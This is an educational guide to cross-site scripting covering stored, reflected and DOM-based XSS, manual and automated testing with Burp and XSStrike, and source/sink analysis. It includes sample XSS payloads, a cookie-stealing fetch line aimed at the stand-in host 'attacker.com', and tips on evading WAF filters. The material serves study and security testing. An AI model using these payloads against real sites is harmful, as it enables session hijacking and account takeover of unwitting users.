# 1. Understanding Cross-Site Scripting (XSS)

XSS is a common web security vulnerability where attackers inject malicious JavaScript code into websites that don't properly sanitize user input. When other users view the affected page, their browsers unknowingly execute this malicious code.

A typical web application works by receiving the `HTML` code from the back-end server and rendering it on the client-side internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra `JavaScript` code in an input field (e.g., `comment/reply`), so once another user views the same page, they unknowingly execute the malicious `JavaScript` code.

---

## 1.1 - What Can XSS Attacks Do?

XSS vulnerabilities enable attackers to run arbitrary JavaScript in a victim's browser, enabling:
- Stealing **session cookies** and sending them to attacker-controlled servers
- Making unauthorized API calls (like changing passwords)
- Mining cryptocurrencies or displaying unwanted ads
- Other malicious actions within the vulnerable website's domain

Because XSS is confined to the browser's JS engine and (in modern browsers) the vulnerable site's own domain, it can't directly achieve system-level code execution. However, if paired with a browser binary vulnerability (e.g., a heap overflow), a skilled attacker can use XSS as a launchpad to escape the browser sandbox and compromise the underlying machine.

XSS has existed in nearly every major web application and has been actively exploited for two decades:

- **Samy Worm (2005):** A stored XSS flaw in MySpace let a self-propagating payload post "Samy is my hero" on viewers' profiles, spreading to over a million accounts in a day. Though harmless in this case, the same flaw could have enabled credential theft, keylogging, or browser exploitation.
- **TweetDeck (2014):** A researcher stumbled on an XSS bug that was used to create a self-retweeting tweet, retweeted 38,000+ times in under two minutes, forcing Twitter to briefly shut down TweetDeck.
- **Google Search (2019)** and **Apache.org (2010)** also suffered XSS vulnerabilities — the latter actively exploited to steal passwords.

These incidents underscore that XSS remains a serious, persistent threat deserving rigorous detection and prevention.

---

## 1.2 - How XSS Works

Cross-Site Scripting (XSS) occurs when a web application takes user-supplied input and renders it back into a page without properly sanitizing or encoding it. Common injection points include **comment fields**, **search boxes**, **URL parameters**, and **reply forms** — anywhere user input eventually gets `reflected into HTML`.

**The basic mechanism:**

**0.** The application accepts input (e.g., a blog comment) and embeds it directly into the page's HTML without escaping special characters like `<`, `>`, or `"`.

**1.** An attacker submits input containing a script tag or event handler instead of plain text:

```html
  <script>alert(document.cookie)</script>
```

  or a more evasive variant using an event handler, useful when `<script>` tags get filtered:

```html
  <img src=x onerror="alert(document.cookie)">
```

**2.** When a victim views the page, their browser parses this injected markup as legitimate code and executes it — not because the browser is flawed, but because it has no way to distinguish the site's intended code from the attacker's injected code.

**Why this is dangerous:**

Because the payload runs in the victim's browser under the vulnerable site's own origin, it inherits that origin's privileges. This lets it sidestep the same-origin policy protections that normally wall off one website's data from another. In practice, this can be used to:

- **Steal session cookies**, allowing the attacker to hijack the victim's authenticated session:
```html
  <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
```
- **Impersonate the victim**, silently issuing authenticated requests (e.g., changing an email or password) using the victim's active session.
- **Harvest sensitive data** rendered on the page, such as personal details, tokens, or private messages.
- **Manipulate the page's content**, for example injecting fake login forms to phish credentials.

**Scope and risk:**

XSS is a client-side attack — it doesn't directly compromise the server or its infrastructure. This is why it's sometimes underrated relative to server-side vulnerabilities. But its real-world impact is significant: it's one of the most common vulnerability classes found in web applications, and a single successful exploit can lead to full account takeover, data theft, or serve as a stepping stone toward more serious attacks. Given how frequently it appears and how easily it can be chained with other flaws, XSS deserves consistent attention in code review, input validation, and output encoding practices — not just a one-time fix.

---

## 1.3 - Types of XSS

> **Note:** To confirm an XSS vulnerability, inject code that executes JavaScript in your browser. The traditional method uses the `alert()` function as it's simple and obvious when triggered. However, in Chrome (from version 92 onward), `alert()` is blocked in cross-origin iframes, so `print()` is recommended as an alternative for testing certain advanced XSS scenarios.
> **Note:** Beyond the cross-origin iframe restriction, many WAFs and input filters specifically pattern-match on `alert(` as a known XSS proof-of-concept signature. For payloads that need to slip past basic filtering, testers often reach for lower-signature PoCs instead: `print()`, `confirm()`, or a unique side-effect like `document.title = 'xss-poc-<random>'` that can be verified without a visible dialog. Worth internalizing now since filter/WAF evasion will build directly on this habit later.

There are three main types of XSS vulnerabilities:

| Type | Description |
|---|---|
| **Stored (Persistent) XSS** | The most critical type of XSS. Occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments). The malicious script comes from the website's database. |
| **Reflected (Non-Persistent) XSS** | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message). The malicious script comes from the current HTTP request. |
| **DOM-based XSS** | Occurs when the tainted data source and the vulnerable sink are both in client-side JavaScript — the vulnerability exists in client-side code rather than server-side code. |

---

# 2. Stored XSS

## 2.1 - Stored XSS definition

The most critical type of XSS vulnerability is `Stored XSS` or `Persistent XSS`. It arises when an application receives data from an untrusted source and includes that data within its later `HTTP` responses in an unsafe way.

The data in question might be submitted to the application via `HTTP` requests; for example, **comments** on a blog post, **user nicknames** in a chat room, or **contact details** on a **customer order**. In other cases, the data might arrive from other untrusted sources; for example, a webmail application displaying **messages received over SMTP**, a marketing application displaying **social media posts**, or a network monitoring application displaying **packet data** from network traffic.

---

### Example flow

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:
```
<p>This post was extremely helpful.</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:
```js
<script>alert('Hacked')</script>
```

Other users who visit the page will now receive the following within the application's response::
```
<p><script>alert('Hacked')</script></p>
```

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application. In this case, `a pop-up alert with message: "Hacked"` show up in the victim browser.

---

## 2.2 - Impact of stored XSS attacks

If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.

> **Tip**: Many modern web apps use cross-domain iframes for user input, so an XSS bug in the form may not affect the main app. Using `window.origin` instead of a static value like `1`, or `hacked` reveals which URL the alert fired on—confirming whether the iframe form (or the main page) is the vulnerable one.

Since some browsers block `alert()` in certain contexts, other payloads help confirm XSS: `<plaintext>` stops HTML rendering and shows everything after it as raw text, while `<script>print()</script>` opens the print dialog and is rarely blocked. Try both, and use reset to clear payloads.

To check persistence, refresh the page. If the alert fires again, the payload is stored on the back-end—confirming Stored/Persistent XSS. This isn't user-specific: anyone visiting the page will trigger it too.

---

## 2.3 - Testing for Stored Cross-Site Scripting

Many stored XSS vulnerabilities can be found using an automated scanner such as Burp Suite's web vulnerability scanner. Manual testing is harder here than for reflected XSS, since you need to track data across two separate points: **entry points** (where attacker data enters the app) and **exit points** (where it might later resurface).

---

### Entry Points

Anywhere attacker-controllable data can enter the app's processing:

- URL query string and message body parameters
- The URL file path
- HTTP request headers (including ones not exploitable for reflected XSS)
- **Out-of-band routes**, which depend entirely on app functionality — e.g. a webmail app processing email content, a Twitter-feed widget processing third-party tweets, or a news aggregator pulling in content from other sites

### Exit Points

Any HTTP response returned to *any* user, in *any* situation — not just the one who submitted the data.


### Why This Is Hard

The core challenge is linking entry points to exit points — finding where submitted data eventually gets emitted:

- **Any entry could map to any exit.** A display name might surface in an obscure audit log only certain users can see.
- **Stored data can be short-lived.** A "recent searches" list, for instance, gets overwritten quickly as other users search.

Exhaustively testing every entry/exit permutation (submit a value, check each possible exit point) isn't practical beyond a handful of pages.

### A More Realistic Approach

Work systematically through entry points, submitting a distinct value at each, and watch responses for that value reappearing — paying particular attention to relevant features like blog comments. When a submitted value shows up, confirm it's genuinely **stored** (persists across separate requests) rather than just reflected back in the immediate response.

### Testing Confirmed Links

Once you've found a real entry→exit link, test it like you would reflected XSS: determine the reflection context, then try candidate payloads suited to that context. From here on, the methodology matches reflected XSS testing.

# 3. Reflected XSS

## 3.1 - Reflected XSS definition

There are two types of `Non-Persistent XSS`: 
- `Reflected XSS`, processed by the back-end
- `DOM-based XSS`, processed entirely client-side without reaching the server.

Unlike Persistent XSS, both are temporary — they don't survive page refreshes and only affect the targeted user, not other visitors.

`Reflected XSS` occurs when input reaches the server and is returned unsanitized, such as in error or confirmation messages. Testing XSS payloads here may trigger execution, but since these messages are temporary, leaving the page ends the attack — hence `Non-Persistent`.

---

### Example flow

Reflected XSS is the simplest variety of cross-site scripting. It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Suppose a website has a search function which receives the user-supplied search term in a URL parameter:
```
https://insecure-website.com/search?term=gift
```

The application echoes the supplied search term in the response to this URL:
```
<p>You searched for: gift</p>
```

Assuming the application doesn't perform any other processing of the data, an attacker can `construct an attack like this and then send it to the victim`:
```
https://insecure-website.com/search?term=<script>alert('Hacked')</script>
```

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application. In this case, `a pop-up alert with message: "Hacked"` show up in the victim browser.

---

## 3.2 - Impact of reflected XSS attacks

If an attacker controls a script executed in the victim's browser, they can typically fully compromise that user. Amongst other things, the attacker can:
- Perform any action within the application that the user can perform.
- View any information that the user is able to view.
- Modify any information that the user is able to modify.
- Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

Delivery requires tricking the victim into making an attacker-controlled request — via a **malicious link on a website**, in **generated content**, or sent through **email/social media** — either targeting a specific user or indiscriminately. Because it needs this external delivery mechanism, reflected XSS is generally less severe than stored XSS, which can be self-contained within the vulnerable app itself.

---

## 3.3 - Testing for Reflected Cross-Site Scripting

The vast majority of reflected XSS vulnerabilities can be found quickly and reliably using an automated scanner such as Burp Suite's web vulnerability scanner. Manual testing follows these steps:

### 1. Test Every Entry Point

Test each entry point for data in the HTTP request separately — URL query parameters, message body parameters, the URL file path, and HTTP headers. Note that header-triggered XSS-like behavior may not always be practically exploitable.

### 2. Submit Random Alphanumeric Values

For each entry point, submit a unique random value and check whether it's reflected in the response. Keep it short enough to survive basic input validation but long enough to avoid accidental matches — around **8 alphanumeric characters** is typically ideal. Burp Intruder's number payloads (with randomized hex generation) can generate these values, and its grep-payloads setting can auto-flag responses containing them.

### 3. Determine the Reflection Context

For each place the value shows up in the response, identify its context — e.g. between HTML tags, inside a (possibly quoted) tag attribute, or within a JavaScript string. Context determines what payload will actually execute.

### 4. Test a Candidate Payload

Based on that context, try an initial XSS payload designed to trigger JS execution if reflected unmodified. Burp Repeater is the easiest way to do this: modify the request with the payload, send it, and inspect the response. A useful trick — keep the original random value in the request alongside the payload, then set that random value as the search term in Repeater's response view; Burp will highlight every occurrence so you can quickly locate the reflection.

### 5. Test Alternative Payloads

If the payload gets modified or blocked, try alternative payloads and techniques suited to the reflection context and the type of filtering in play. See [XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts) for context-specific strategies.

### 6. Confirm in a Real Browser

Once a payload works in Burp Repeater, transfer it to an actual browser (paste the URL into the address bar, or modify the request via Burp Proxy's intercept view) to confirm real execution. `alert(document.domain)` is a good default test — it produces a visible popup if the attack succeeds.

# 4. DOM XSS

The third and final type of XSS is another `Non-Persistent` type called `DOM-based XSS`. While `reflected XSS` sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`.

## 4.1 - DOM XSS example

Let's say we have a "To-Do List" web application that take our input and then reflect it on the website as tasks like a list. We can try adding a `test` item:

<img width="1014" height="352" alt="image" src="https://github.com/user-attachments/assets/c9748e15-944f-4f88-9f41-ee329745e65d" />

However, if we open the `Network` tab in the Firefox Developer Tools, and re-add the `test` item, we would notice that no HTTP requests are being made:

<img width="1016" height="326" alt="image" src="https://github.com/user-attachments/assets/0aee1371-77d4-4cbd-a8d5-7309638ca1db" />

We see that the input parameter in the URL is using a hashtag `#` for the item we added, which means that this is a `client-side parameter that is completely processed on the browser`. This indicates that the input is being processed at the `client-side` through `JavaScript` and `never reaches the back-end`; hence it is a `DOM-based XSS`.

Furthermore, if we look at the page source by hitting `CTRL+U`, we will notice that our `test` string is nowhere to be found. This is because the JavaScript code is updating the page when we click the `Add` button, which is after the page source is retrieved by our browser, hence the base page source will not show our input, and if we refresh the page, it will not be retained (i.e. `Non-Persistent`). We can still view the rendered page source with the Web Inspector tool by clicking `CTRL+SHIFT+C`:

<img width="1015" height="468" alt="image" src="https://github.com/user-attachments/assets/94c1868c-3b60-4f70-bc8c-11fae0f8c4ca" />

## 4.2 - Source and Sink

To further understand the nature of the `DOM-based XSS` vulnerability, we must understand the concept of the **`Source`** and **`Sink`** of the object displayed on the page. 

- The **`Source`** is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
- On the other hand, the **`Sink`** is the function that writes the user input to a `DOM Object` on the page. If the `Sink` function does not properly sanitize the user input, it would be vulnerable to an XSS attack.

Some of the commonly used `JavaScript` functions to write to `DOM` objects are:
```
document.write()              element.innerHTML
DOM.innerHTML                 element.outerHTML
DOM.outerHTML                 element.insertAdjacentHTML
document.writeln()            element.onevent
document.domain
```

Furthermore, some of the `jQuery` library functions that write to `DOM` objects are:

```
add()             replaceAll()
after()           replaceWith()
append()          wrap()
animate()         wrapInner()
insertAfter()     wrapAll()
insertBefore()    has()
before()          constructor()
html()            init()
prepend()         index()
                  jQuery.parseHTML() / $.parseHTML()
```

If a `Sink` function **writes the exact input without any sanitization** (like the above functions), and no other means of sanitization were used, then we know that the page should be **vulnerable to XSS**.

We can look at the `source code` of the `To-Do` web application, and check `script.js`, and we will see that the `Source` is being taken from the `task=` parameter:
```js
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

Right below these lines, we see that the page uses the `innerHTML` function to write the `task` variable in the `todo` DOM:
```js
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

---

## 4.3 - DOM Attacks

If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the `innerHTML` function does not allow the use of the `<script>` tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain `<script>` tags, like the following XSS payload:
```
<img src="" onerror=alert(window.origin)>
```

The above line creates a new HTML image object, which has a `onerror` attribute that can execute JavaScript code when the image is not found. So, as we provided an empty image link (`""`), our code should always get executed without having to use `<script>` tags:

<img width="1023" height="378" alt="image" src="https://github.com/user-attachments/assets/fa0417aa-2974-4882-9b47-0d979c42666c" />

To target a user with this DOM XSS vulnerability, we can once again copy the URL from the browser and share it with them, and once they visit it, the JavaScript code should execute. 

---

## 4.4 - Summary of DOM XSS

Overall, DOM-based XSS vulnerabilities usually arise when `JavaScript` takes data from an attacker-controllable `source`, such as the URL, and passes it to a `sink` that supports dynamic code execution, such as `eval()` or `innerHTML`. This enables attackers to execute malicious `JavaScript`, which typically allows them to hijack other users' accounts.

To deliver a `DOM-based XSS` attack, you need to place data into a source so that it is propagated to a `sink` and causes execution of arbitrary `JavaScript`.

The most common source for `DOM XSS` is the `URL`, which is typically accessed with the `window.location` object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the `URL`. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be placed in the path.

---

## 4.5 - Testing for DOM XSS

The majority of DOM XSS vulnerabilities can be found quickly and reliably using an automated scanner such as Burp Suite's web vulnerability scanner. Manual testing still matters, though — it's what catches custom sinks, obfuscated or minified JavaScript, and unusual data flows that automated tools can miss.

To test manually, you generally need a browser with developer tools, such as Chrome. Work through each available **source** (see the sinks/sources table in the earlier notes) in turn, testing each one individually.

---

### Testing HTML Sinks

To test for DOM XSS in an HTML sink:

1. Place a random alphanumeric string into the source (e.g. `location.search`).
2. Use developer tools to inspect the HTML and find where your string appears.

**Note:** the browser's "View source" option won't work here — it doesn't reflect changes made to the HTML by JavaScript. In Chrome's dev tools, use `Ctrl+F` (`Cmd+F` on macOS) to search the live DOM for your string.

For each location where your string appears, identify the **context** it landed in, then refine your input accordingly. For example, if it appears inside a double-quoted attribute, try injecting a double quote to see if you can break out of the attribute.

**Encoding caveat:** URL-encoding behavior for sources like `location.search` and `location.hash` can vary — not just across browsers, but across contexts within the same browser (e.g. direct navigation vs. fetch vs. iframe). If your data gets URL-encoded before reaching the sink, an XSS attack via that path is unlikely to work — always verify encoding behavior for the specific context you're testing.

---

### Testing JavaScript Execution Sinks

These are harder to test, since your input doesn't necessarily appear anywhere in the DOM — you can't just search for it. Instead, use the JavaScript debugger to trace whether and how your input reaches a sink.

1. For a given source (e.g. `location`), search the page's JavaScript for references to it. In Chrome's dev tools, use `Ctrl+Shift+F` (`Cmd+Alt+F` on macOS) to search all page scripts.
2. Once you find where the source is read, set a breakpoint and step through how its value is used.
3. If the value gets assigned to other variables, repeat the search to track those variables and see if they eventually reach a sink.
4. When you find a sink receiving data that traces back to the source, hover over the variable in the debugger to inspect its value just before it hits the sink.
5. As with HTML sinks, refine your input from there to see if you can deliver a working XSS payload.

---

### Testing for DOM XSS using DOM Invader

Identifying and exploiting DOM XSS in the wild can be a tedious process, often requiring you to manually trawl through complex, minified JavaScript. If you use Burp's browser, however, you can take advantage of its built-in DOM Invader extension, which does a lot of the hard work for you.

Read more [here](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)

# 5. XSS Discovery

With a solid grasp of what XSS is, its three types, and how JS injection works, this section covers how to actually *find* XSS vulnerabilities in a web application.

As with most vulnerabilities, detection can be nearly as hard as exploitation — but because XSS is so widespread, plenty of tooling exists to help.

---

## 5.1 - Automated Discovery

Most web application vulnerability scanners (Nessus, **Burp Pro's web vulnerability scanner**, ZAP, etc.) can detect all three XSS types using two scan modes:

- **Passive scan** — reviews client-side code for potential DOM-based issues
- **Active scan** — injects various payloads into the page to try to trigger execution

Paid tools tend to be more accurate, especially when bypassing security filters is required, but solid open-source options exist too — [XSStrike](https://github.com/s0md3v/XSStrike), [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser) among them. These generally work by finding input fields, firing a range of payloads, and checking whether the payload reappears unmodified in the rendered response (a possible sign of successful injection). This method isn't fully reliable — a reflected payload doesn't always mean successful execution — so manual verification is still necessary.

**Example: XSStrike**

```shellsession
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```

Running it against a target parameter:

```shellsession
$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

        XSStrike v3.1.4

[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: task 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <HtMl%09onPoIntERENTER+=+confirm()> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N]
```

XSStrike analyzes reflections, generates candidate payloads, and reports back a working payload with an efficiency/confidence score — e.g. flagging `task` as vulnerable via an `onpointerenter` HTML event payload. Any reported finding should still be manually verified against the actual target.

---

## 5.2 - Manual Discovery

Difficulty here scales with the target's security maturity — basic XSS is often found just by trying known payloads, while advanced cases require real code review skill.

### Methodology: Reflected & Stored XSS

1. Submit a short, unique input (e.g. a random alphanumeric string) into every entry point.
2. Identify every location in the HTTP responses where that input is echoed back.
3. Determine the reflection [context](https://portswigger.net/web-security/cross-site-scripting/contexts) at each location — this determines which payload is worth trying.
4. Test a candidate payload suited to that context to see if arbitrary JavaScript executes.

### Methodology: DOM-Based XSS

For DOM XSS driven by URL parameters, the process is similar: place unique input in the parameter, search the DOM via browser dev tools, and test each hit for exploitability.

Other DOM XSS variants are harder to catch this way — vulnerabilities from non-URL sources (e.g. `document.cookie`) or non-HTML sinks (e.g. `setTimeout`) generally require manually reviewing the JavaScript itself, which is slow. Burp's scanner combines static and dynamic JS analysis to automate this detection more reliably than manual review alone.

### Sourcing Payloads

The most basic version of step 4 above: pull payload lists from resources like [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or [Payload-Box](https://github.com/payload-box/xss-payload-list), or [PortSwigger Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), and test them one by one against input fields, watching for a triggered alert.

**Note:** XSS isn't limited to visible HTML input fields — it can also land via HTTP headers like `Cookie` or `User-Agent`, if their values get reflected on the page.

Most payloads from generic lists won't work out of the box, since they're written for specific injection contexts (e.g. breaking out of a single-quoted attribute) or designed to bypass specific filters. They also span different injection vectors — `<script>` tags, HTML attributes like `<img>`, or CSS style properties — so expect a lot of misses even against genuinely vulnerable targets.

### Scaling Beyond Copy-Paste

Manually copy-pasting payloads doesn't scale well across many input fields. A more efficient (if advanced) approach is scripting the payload delivery and comparing rendered output automatically, customized to the target application — useful in cases where off-the-shelf tools fall short, though it's beyond this module's scope.

### Code Review

The most reliable detection method is manual code review, covering both back-end and front-end code. Understanding exactly how input flows through to the browser lets you craft a payload with high confidence it'll work — the source/sink analysis covered earlier for DOM XSS is a basic example of this approach.

Popular, well-maintained web applications are unlikely to fall to generic payload lists or scanners, since their developers typically run these same tools pre-release and patch what's found. For these targets, manual code review is often the only way to surface XSS vulnerabilities that survived public release.

# 6. Content security policy

Content security policy (CSP) is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities. If an application that employs CSP contains XSS-like behavior, then the CSP might hinder or prevent exploitation of the vulnerability. Often, the CSP can be circumvented to enable exploitation of the underlying vulnerability.

# 7. Dangling markup injection

Dangling markup injection is a technique that can be used to capture data cross-domain in situations where a full cross-site scripting exploit is not possible, due to input filters or other defenses. It can often be exploited to capture sensitive information that is visible to other users, including CSRF tokens that can be used to perform unauthorized actions on behalf of the user.
